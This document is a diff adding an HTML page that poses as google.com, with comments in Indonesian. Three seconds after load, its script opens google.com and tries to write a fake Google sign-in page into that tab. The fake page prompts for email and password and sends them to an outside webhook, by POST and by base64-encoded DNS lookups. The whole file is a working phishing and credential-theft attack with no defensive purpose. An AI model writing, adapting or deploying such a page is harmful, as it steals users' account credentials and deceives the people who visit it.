@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>google.com</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      background: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+    }
+    .container {
+      max-width: 500px;
+      padding: 40px;
+    }
+    h1 {
+      color: #4285f4;
+      font-size: 3rem;
+      margin-bottom: 2rem;
+    }
+    .info {
+      font-size: 1.2rem;
+      color: #666;
+      margin-bottom: 3rem;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>Google</h1>
+    <p class="info">Loading secure connection... Please wait</p>
+  </div>
+
+  <script>
+    // OOB webhook kamu
+    const OOB = "https://young-comet-60.webhook.cool";
+
+    function y() {
+      // Buka tab baru dengan domain target (spoof origin)
+      const x = window.open('http://www.google.com', '_top');
+
+      if (!x) {
+        alert("Popup diblokir. Izinkan popup untuk situs ini.");
+        return;
+      }
+
+      // Delay lebih panjang + document.open/write/close (lebih stabil)
+      setTimeout(() => {
+        try {
+          x.document.open();
+          x.document.write(`
+            <html>
+              <head><title>Sign in - Google Accounts</title></head>
+              <body style="margin:0; font-family:Arial; background:#f1f1f1; display:flex; justify-content:center; align-items:center; height:100vh;">
+                <div style="background:white; padding:40px; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1); text-align:center; width:400px;">
+                  <h1>Sign in</h1>
+                  <p style="color:#5f6368;">To continue to www.google.com</p>
+                  <img src="x" onerror="
+                    setTimeout(async function() {
+                      const creds = prompt('Sign into your account in order to access www.google.com', 'E-mail / Password');
+                      if (creds && creds.trim() !== '') {
+                        // Primary: POST ke webhook
+                        try {
+                          await fetch('${OOB}/creds', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                              credentials: creds.trim(),
+                              timestamp: new Date().toISOString(),
+                              origin: location.href,
+                              userAgent: navigator.userAgent
+                            })
+                          });
+                          console.log('POST sent to OOB');
+                        } catch(e) { console.log('POST failed:', e); }
+
+                        // Backup: DNS OOB (split 3 parts)
+                        const b64 = btoa(creds.trim()).replace(/=/g, '');
+                        const p1 = b64.substring(0, 200);
+                        const p2 = b64.substring(200, 400);
+                        const p3 = b64.substring(400);
+                        new Image().src = 'https://' + p1 + '.${OOB}';
+                        if (p2) new Image().src = 'https://' + p2 + '.${OOB}';
+                        if (p3) new Image().src = 'https://' + p3 + '.${OOB}';
+                      }
+                    }, 150)
+                  ">
+                </div>
+              </body>
+            </html>
+          `);
+          x.document.close();
+          console.log("Injection success");
+        } catch (e) {
+          console.error("Injection failed:", e);
+        }
+      }, 800); // Delay lebih panjang agar tab ready
+    }
+
+    // Trigger setelah 3 detik
+    setTimeout(y, 3000);
+
+    console.log("Spoof script loaded. Waiting 3s to trigger...");
+  </script>
+
+</body>
+</html>
